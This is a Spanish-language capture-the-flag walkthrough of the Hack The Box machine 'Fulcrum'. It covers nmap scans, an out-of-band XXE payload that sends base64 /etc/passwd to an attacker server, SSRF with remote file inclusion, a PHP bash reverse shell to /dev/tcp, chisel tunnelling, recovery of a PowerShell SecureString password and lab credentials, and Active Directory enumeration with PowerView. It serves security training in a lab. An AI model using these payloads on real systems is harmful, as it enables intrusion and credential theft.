---
layout: single
title: Fulcrum - Hack The Box
excerpt: "Fulcrum, una de las máquinas más desafiantes en Hack The Box, requiere múltiples pivotes entre Linux y Windows, y se centra en el uso intensivo de PowerShell. Es un servidor Linux con cuatro sitios web, incluido uno que devuelve mensajes de error de Windows .NET. La explotación implica aprovechar un punto final de la API mediante XXE y utilizarlo como SSRF para lograr ejecución a través de una inclusión remota de archivos. A partir de ahí, el proceso incluye el pivoteo al servidor web de Windows con credenciales obtenidas, la enumeración de LDAP, el cambio al servidor de archivos, que tiene acceso a las comparticiones en el DC. En estas comparticiones, se encuentra un script de inicio de sesión con credenciales asociadas a un administrador de dominio, utilizado para acceder y obtener la bandera del DC, así como para obtener una shell. Esta máquina presenta un enfoque significativo en el túneling, representando una red pequeña con sistemas operativos mixtos en un único entorno."
date: 2023-11-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-fulcrum/fulcrum_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - web
  - vulnerability assesment
tags:
  - injection
  - Active Directory
  - XXE Injection
  - Clear Text Credentials
  - Authentication
  - Information Disclosure 
---

![](/assets/images/htb-writeup-fulcrum/fulcrum_logo.png)

"Fulcrum, una de las máquinas más desafiantes en Hack The Box, requiere múltiples pivotes entre Linux y Windows, y se centra en el uso intensivo de PowerShell. Es un servidor Linux con cuatro sitios web, incluido uno que devuelve mensajes de error de Windows .NET. La explotación implica aprovechar un punto final de la API mediante XXE y utilizarlo como SSRF para lograr ejecución a través de una inclusión remota de archivos. A partir de ahí, el proceso incluye el pivoteo al servidor web de Windows con credenciales obtenidas, la enumeración de LDAP, el cambio al servidor de archivos, que tiene acceso a las comparticiones en el DC. En estas comparticiones, se encuentra un script de inicio de sesión con credenciales asociadas a un administrador de dominio, utilizado para acceder y obtener la bandera del DC, así como para obtener una shell. Esta máquina presenta un enfoque significativo en el túneling, representando una red pequeña con sistemas operativos mixtos en un único entorno."

## <span style="color: yellow;">Enumeración</span>


#### <span style="color: gray;">Nmap</span>
```
┌─[root@parrot]─[/home/ot3ro/HTB/Fulcrum/Nmap]
└──╼ #nmap -sT 10.10.10.62 -p- --open -Pn -n --reason -vv -oA nmap-sT-fulcrum

PORT      STATE SERVICE      REASON
4/tcp     open  unknown      syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
88/tcp    open  kerberos-sec syn-ack
9999/tcp  open  abyss        syn-ack
56423/tcp open  unknown      syn-ack
```
```
┌─[root@parrot]─[/home/ot3ro/HTB/Fulcrum/Nmap]
└──╼ #nmap -sVC 10.10.10.62 -p4,22,80,88,9999,56423 -oN nmap-sV-fulcrum
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-13 16:24 CST
Nmap scan report for 10.10.10.62
Host is up (0.15s latency).

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Input string was not in a correct format.
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: phpMyAdmin
|_http-server-header: nginx/1.18.0 (Ubuntu)
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Input string was not in a correct format.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: nginx/1.18.0 (Ubuntu)
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
En el escaneo realizado con Nmap, se han identificado diversos servicios en el sistema. Estos incluyen servidores web con Nginx 1.18.0 con sistema operativo Ubuntu en puertos 4, 80, 88, 9999, y 56423. Además, se ha detectado un servicio SSH en el puerto 22. La información del servidor sugiere que el sistema operativo subyacente es Ubuntu.
## <span style="color: yellow;">XXE</span>

Hemos identificado la presencia de la API 'Fulcrum-API Beta', la cual opera en el puerto 56423 y responde con datos encapsulados en formato JSON. No obstante, hemos observado que esta API también admite la interpretación de datos en formato XML, lo que nos habilita para ejecutar comandos de entidad externa XML
![](/assets/images/htb-writeup-fulcrum/burpsuiteXXETest.png)

```
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [10/Nov/2023 14:23:33] code 404, message File not found
10.10.10.62 - - [10/Nov/2023 14:23:33] "GET /test HTTP/1.0" 404 -
```

#### <span style="color: orange;">XXE-OOB</span>

Se ha observado que al intentar volcar archivos directamente en la consulta XML, el servidor no muestra ninguna respuesta. No obstante, se ha logrado tener éxito al realizar un ataque de  XXE fuera de banda para extraer información del servidor


Para llevar a cabo el ataque, primero declararemos nuestras entidades paramétricas en un archivo que expondremos a través de un servidor Python. Posteriormente, haremos referencia a estas entidades desde Burp Suite al realizar una petición de nuestro archivo hacia nuestro servidor
```bash
cat xxe.dtd

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.14/?content=%file;'>">

```

![](/assets/images/htb-writeup-fulcrum/burpsuiteXXEOob.png)

```
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [10/Nov/2023 14:25:55] "GET /xxe.dtd HTTP/1.0" 200 -
10.10.10.62 - - [10/Nov/2023 14:25:55] "GET /?content=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 200 -

```
 
```bash
echo '<Base64Hash>' | base64 -d

```
Y vemos que el ataque es exitoso, al lograr obtener el archivo /etc/passwd en base64.

### <span style="color: orange;">SSRF</span>
Después de intentar adivinar posibles rutas para los archivos de configuración e index.php de los sitios, tuvimos éxito al identificar los directorios 'api' y 'uploads'. Como resultado, logramos extraer exitosamente el contenido de los archivos index.php.
```php
/var/www/api/index.php


<?php
	header('Content-Type:application/json;charset=utf-8');
	header('Server: Fulcrum-API Beta');
	libxml_disable_entity_loader (false);
	$xmlfile = file_get_contents('php://input');
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
	$input = simplexml_import_dom($dom);
	$output = $input->Ping;
	//check if ok
	if($output == "Ping")
	{
		$data = array('Heartbeat' => array('Ping' => "Ping"));
	}else{
		$data = array('Heartbeat' => array('Ping' => "Pong"));
	}
	echo json_encode($data);


?>
```

```php
/var/www/uploads/index.php

<?php
if($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
{
	echo "<h1>Under Maintance</h1><p>Please <a href=\"http://" . $_SERVER['SERVER_ADDR'] . ":4/index.php?page=home\">try again</a> later.</p>";
}else{
	$inc = $_REQUEST["page"];
	include($inc.".php");
}
?>

```

Verificación de la dirección IP:

El script index.php del directorio uploads verifica si la solicitud no proviene de "127.0.0.1" (localhost). Si es verdadero, muestra un mensaje "En mantenimiento" con un enlace para intentarlo nuevamente más tarde, redirigiendo al usuario a la página de inicio. Si es falso (la solicitud es desde localhost), el script incluye dinámicamente un archivo PHP especificado por el parámetro "page", permitiendo la carga dinámica de contenido basada en la solicitud

En caso de lograr la ejecución desde el localhost de la máquina víctima, sería posible ejecutar comandos a través del parámetro 'page'.


![](/assets/images/htb-writeup-fulcrum/websitePort4.png)

### <span style="color: blue;">Shell</span>

Con el objetivo de explotar la vulnerabilidad de Server-Side Request Forgery (SSRF) mediante una entidad externa en XML, estableceremos una referencia a una entidad que apunta al localhost de la máquina víctima a través del puerto 4. Aprovechando el parámetro 'page', realizaremos una solicitud a nuestro archivo PHP que contiene la shell inversa, buscando así obtener acceso no autorizado al sistema objetivo

```bash
cat shell.php 
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'");?>

```
```bash
sudo nc -lnvp 443
```
```bash
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $sudo python3 -m http.server 80
```

```
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $curl -X POST 10.10.10.62:56423 -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY remote SYSTEM "http://0.0.0.0:4/index.php?page=http://10.10.14.14/shell">]><test>&remote;</test>'
```

```
┌─[root@parrot]─[/home/ot3ro/HTB/Fulcrum]
└──╼ #sudo nc -lnvp 443
www-data@fulcrum:~/uploads$ whoami
www-data
```

logramos obtener acceso al sistema como el usuario www-data

```bash
www-data@fulcrum:~/uploads$ cat Fulcrum_Upload_to_Corp.ps1 
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1

```
El script "Fulcrum_Upload_to_Corp.ps1" en PowerShell se utiliza para ejecutar comandos remotos en el equipo upload.fulcrum.local. Utiliza credenciales encriptadas almacenadas en el script para autenticarse y ejecuta el comando de transferencia de un archivo llamado Data.ps1 en el equipo remoto.

```bash
www-data@fulcrum:~$ ps aux

...[SNIP]...

[...]/usr/bin/qemu-system-x86_64 -name guest=DC,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-1-DC/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,mds-no=on,pschange-mc-no=on,sha-ni=off,umip=off,rdpid=off,xgetbv1=off,perfctr-core=off,clzero=off,xsaveerptr=off,wbnoinvd=off,amd-stibp=off -m 2048 -overcommit mem-lock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 9a05695b-6539-4178-b064-cdff977f2eb5 -no-user-config -nodefaults -chardev socket,id=charmonitor,fd=30,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=delay -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x5.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x5 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x5.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x5.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -blockdev {"driver":"file","filename":"/var/lib/libvirt/images/DC.qcow2","node-name":"libvirt-1-storage","auto-read-only":true,"discard":"unmap"} -blockdev {"node-name":"libvirt-1-format","read-only":false,"driver":"qcow2","file":"libvirt-1-storage","backing":null} -device ide-hd,bus=ide.0,unit=0,drive=libvirt-1-format,id=ide0-0-0,bootindex=1 -netdev tap,fd=32,id=hostnet0 -device e1000,netdev=hostnet0,id=net0,mac=52:54:00:9e:52:f2,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5900,addr=127.0.0.1,disable-ticketing,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vram64_size_mb=0,vgamem_mb=16,max_outputs=1,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -msg timestamp=on
[...]/usr/bin/qemu-system-x86_64 -name guest=WEB01,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-2-WEB01/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2apic=on,tsc-deadline=on,hypervisor=on,tsc-adjust=on,arch-capabilities=on,xsaves=on,virt-ssbd=on,rdctl-no=on,skip-l1dfl-vmentry=on,
[...]/usr/bin/qemu-system-x86_64 -name guest=FILE,debug-threads=on -S -object secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-3-FILE/master-key.aes -machine pc-i440fx-focal,accel=kvm,usb=off,vmport=off,dump-guest-core=off -cpu EPYC-Rome,x2ap

...[SNIP]...
```
AL listar los procesos, la información proporcionada muestra procesos relacionados con la virtualización mediante QEMU y libvirt, encontramos tres máquinas virtuales: "DC","WEB01" y "FILE"

```
www-data@fulcrum:/etc/nginx/sites-available$ cat default 

...[SNIP]...

server {
        listen 80 default_server;
        listen [::]:80 default_server;


        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                proxy_pass http://192.168.122.228;
        }

        location /uploads {
                try_files $uri $uri/ =404;
        }

...[SNIP]...
}

```
el servidor nginx por el puerto 80 actúa como un proxy inverso. Todas las solicitudes al puerto 80 son reenviadas al servidor ubicado en la dirección IP 192.168.122.228.

```
www-data@fulcrum:/etc/nginx/sites-available$ ip a

...[SNIP]...

3: virbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 52:54:00:97:17:b7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0

...[SNIP]...

```
```
www-data@fulcrum:~$ arp -n
arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.122.132          ether   52:54:00:9e:52:f3   C                     virbr0
192.168.122.130          ether   52:54:00:9e:52:f2   C                     virbr0
192.168.122.228          ether   52:54:00:9e:52:f4   C                     virbr0
10.10.10.2               ether   00:50:56:b9:5b:c9   C                     ens160

```
Hemos identificado una interface que usa la IP "192.168.122.1/24", y los hosts "192.168.122.132","192.168.122.130","192.168.122.228"

Realicé  un escaneo de hosts en la red 192.168.122.0/24 y escaneo de puertos en el host identificado utilizando scripts one-liners
```bash
www-data@fulcrum:~$ echo "Scanning hosts on 192.168.122.1/24"; for i in {2..254}; do if ping -c1 -w1 192.168.122.$i &>/dev/null; then echo "[+] Host 192.168.122.$i is UP"; fi; done

Scanning hosts on 192.168.122.1/24
[+] Host 192.168.122.228 is UP


www-data@fulcrum:~$ ping -c3 192.168.122.228
PING 192.168.122.228 (192.168.122.228) 56(84) bytes of data.
64 bytes from 192.168.122.228: icmp_seq=1 ttl=128 time=6.00 ms
64 bytes from 192.168.122.228: icmp_seq=2 ttl=128 time=0.346 ms
64 bytes from 192.168.122.228: icmp_seq=3 ttl=128 time=15.7 ms


www-data@fulcrum:~$ echo "Scanning ports on host 192.168.122.228"; for port in $(seq 1 65535); do timeout 0.1 bash -c "</dev/tcp/192.168.122.228/$port" >/dev/null 2>&1 && echo "[+] port $port is open"; done 

Scanning ports on host 192.168.122.228
[+] port 80 is open
[+] port 5985 is open

```
EL escaneo nos revela 2 puertos abiertos en el host 192.168.122.228, el puerto 80 HTTP y el puerto 5985 WinRM.

Ahora podríamos intentar decodificar el password almacenado en el script "Fulcrum_Upload_to_Corp.ps1" de powershell y usar las credenciales para conectarnos al host aprovechando el servicio abierto de WinRM.

debemos de modificar el script para obtener el password en texto plano. Vamos a eliminar todo el contenido de la línea que dice "Invoke-Command..." y luego agregaremos un comando que convierte una 'SecureString'($4) en una cadena de texto plano($plaintextPassword).

#### <span style="color: gray;">Fulcrum_Upload_to_Corp.ps1</span>
```
...[SNIP]...

$plaintextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringUni([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($4))

Write-Output $plaintextPassword

```
Luego de modificar el script lo ejecutamos.
```
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $pwsh Fulcrum_Upload_to_Corp.ps1 

M4ng£m£ntPa55

```
Se nos revela la contraseña del usuario "WebUser" en texto plano

Ahora con el uso de la herramienta 'Chisel' vamos a crear un túnel con la máquina 192.168.122.228 por el puerto 5985

```bash
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $./chisel server --reverse -p 5984
```

```
www-data@fulcrum:~$ cd /tmp	
www-data@fulcrum:/tmp$ wget http://10.10.14.14/chisel
wget http://10.10.14.19/chisel
--2023-11-14 01:55:58--  http://10.10.14.14/chisel
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: 'chisel.1'
...[SNIP]...
www-data@fulcrum:/tmp$ chmod +x chisel
```

```bash
www-data@fulcrum:/tmp$ ./chisel client 10.10.14.14:5984 R:5985:192.168.122.228:5985
```
Una vez creado el túnel, nos podemos conectar a la máquina remota desde nuestro localhost usando la herramienta "Evil-Winrm"

### <span style="color: red;">WinRM</span>


### <span style="color: blue;">usuario webuser</span>

```
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $evil-winrm -i 0.0.0.0 -u 'webuser' -p 'M4ng£m£ntPa55'
                                        
*Evil-WinRM* PS C:\Users\WebUser\Documents> whoami
webserver\webuser
```
LOgramos ingresar a la máquina como el usuario webuser.

```
*Evil-WinRM* PS C:\inetpub\wwwroot> gc web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
...[SNIP]...
```

En el archivo 'web.config' del directorio webroot, hemos encontrado las credenciales "FULCRUM\LDAP":"PasswordForSearching123!". Estas credenciales nos permiten establecer una conexión al dominio dc.fulcrum.local. Podríamos crear un objeto PSCredential utilizando el usuario mencionado para ejecutar comandos bajo sus credenciales

Podemos descargar el script PowerView.ps1 para enumerar usuarios en el dominio dc.fulcrum.local

>><p style="font-size: 16px;">En mi caso estuve usando el comando: "certutil.exe -urlcache -split -f http://my_ip:port/file" para transferir archivos.</p>

```
*Evil-WinRM* PS C:\Users\WebUser\Documents> Import-Module ./PowerView.ps1
*Evil-WinRM* PS C:\Users\WebUser\Documents> $SecPass = ConvertTo-SecureString "PasswordForSearching123!" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\WebUser\Documents> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\ldap',$SecPass)
*Evil-WinRM* PS C:\Users\WebUser\Documents> Get-DomainUser -Credential $cred -DomainController dc.fulcrum.local


...[SNIP]...


company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=BTables,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password set to ++FileServerLogon12345++
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345


*Evil-WinRM* PS C:\Users\WebUser\Documents> Get-DomainUser -Credential $cred -DomainController dc.fulcrum.local | select name,lastlogon,memberof

name          lastlogon             memberof
----          ---------             --------
Administrator 5/8/2022 1:49:11 AM   {CN=Group Policy Creator Owners,CN=Users,DC=fulcrum,DC=local, CN=Domain Admins,CN=Users,DC=fulcrum,DC=local, CN=Enterprise Admins,CN=Users,DC=fulcrum,DC=local, CN=Schema Admins,CN=Users,DC=fulcrum,DC=local...}
Guest         12/31/1600 4:00:00 PM CN=Guests,CN=Builtin,DC=fulcrum,DC=local
krbtgt        12/31/1600 4:00:00 PM CN=Denied RODC Password Replication Group,CN=Users,DC=fulcrum,DC=local
ldap          11/13/2023 9:29:29 PM
923a          11/13/2023 9:22:04 PM CN=Domain Admins,CN=Users,DC=fulcrum,DC=local
BTables       11/13/2023 8:28:14 PM

```
Se ha identificado un usuario denominado "BTables". El mensaje contenido en la etiqueta 'info' revela que la contraseña asociada a este usuario ha sido modificada o establecida. La nueva contraseña es especificada como '++FileServerLogon12345++'. Esta contraseña sugiere una posible relación con el host virtual denominado "FILE" que previamente hemos descubierto; otro usuario interesante es "923a" que está asociado al grupo "Domain Admins"

```
*Evil-WinRM* PS C:\Users\WebUser\Documents> Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock {whoami}
fulcrum\btables

```

He creado un script en PowerShell para escanear subdominios, y al ejecutarlo, confirmé que el host "file.fulcrum.local" está activo

```bash
┌─[ot3ro@parrot]─[~/HTB/Fulcrum]
└──╼ $cat SubdomainScanner.ps1 

# Ruta al archivo que contiene la lista de subdominios
$subdomainsFile = "C:\Users\WebUser\Documents\subdomains-top1million-5000.txt"

# Leer la lista de subdominios desde el archivo
$subdomains = Get-Content $subdomainsFile

# Script a ejecutar
$scriptBlock = {
    param($subdomain)
    $hostname = $subdomain + ".fulcrum.local"
    $result = Invoke-Command -ComputerName $hostname -ScriptBlock { $env:COMPUTERNAME } -ErrorAction SilentlyContinue
    if ($result) {
        "The subdomain $hostname is UP and its hostname is: $result"
    }
}

# Iterar sobre la lista de subdominios y mostrar solo los activos
foreach ($subdomain in $subdomains) {
    # Ejecutar el script con el subdominio actual
    Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock $scriptBlock -ArgumentList $subdomain
}

```
```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> .\SubdomainScanner.ps1

The subdomain file.fulcrum.local is UP and its hostname is: FILE
The subdomain dc.fulcrum.local is UP and its hostname is: DC

```
```
*Evil-WinRM* PS C:\Users\WebUser\Documents> Test-NetConnection -ComputerName file.fulcrum.local 
Warning: Ping to 192.168.122.132 failed with status: TimedOut


ComputerName           : file.fulcrum.local
RemoteAddress          : 192.168.122.132
InterfaceAlias         :
